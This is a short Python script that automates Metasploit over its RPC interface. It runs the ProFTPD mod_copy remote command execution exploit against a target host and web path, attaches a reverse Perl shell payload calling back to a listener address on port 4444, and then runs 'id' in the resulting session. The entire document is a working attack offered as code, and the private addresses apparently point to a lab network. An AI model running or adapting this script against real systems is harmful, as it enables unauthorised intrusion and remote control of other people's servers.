from pymetasploit3.msfrpc import MsfRpcClient
client = MsfRpcClient('123', ssl=True)
exploit = client.modules.use('exploit', 'unix/ftp/proftpd_modcopy_exec')
exploit['RHOSTS'] = '192.168.31.254' # target
#print(exploit['SITEPATH'])
exploit['SITEPATH'] = '/var/www/html' # target
#print(exploit['SITEPATH'])
options=exploit.options
#print(exploit.missing_required) 
#print(options)
#print(exploit.targetpayloads())
payload= client.modules.use('payload', 'cmd/unix/reverse_perl')
payload['LHOST'] = '192.168.31.168'
payload['LPORT'] = 4444
result=exploit.execute(payload=payload)
#print(result)
#print(client.sessions.list)
shell = client.sessions.session('1')
shell.write('id')
print(shell.read())
